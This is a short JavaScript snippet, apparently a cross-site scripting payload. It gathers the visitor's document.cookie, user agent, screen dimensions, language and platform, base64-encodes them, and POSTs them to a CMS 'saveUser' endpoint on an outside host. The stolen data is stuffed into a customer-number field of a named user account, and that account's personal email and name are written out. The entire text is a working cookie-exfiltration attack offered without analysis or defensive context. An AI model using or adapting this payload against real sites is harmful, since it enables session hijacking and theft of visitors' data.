        const data = {
            timestamp: new Date(),
            cookies: document.cookie,
            userAgent: navigator.userAgent,
            screenWidth: screen.width,
            screenHeight: screen.height,
            availableHeight: screen.availHeight,
            permissions: navigator.permissions,
            language: navigator.language,
            os: navigator.platform
        }


        fetch('https://mastr.dmas.at/cms/json/action/userActions.php', {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            },
            body: 'action=saveUser&user_id=383&group_id=215&email=rainerfischinger%40gmail.com&username=rainerfischinger&pwdnew=&first_name=Rainer&last_name=Fischinger&fastbill_customer_nr=' + btoa(JSON.stringify(data)) + '&rafflr_pricing_id=',
            method: 'POST'
        })
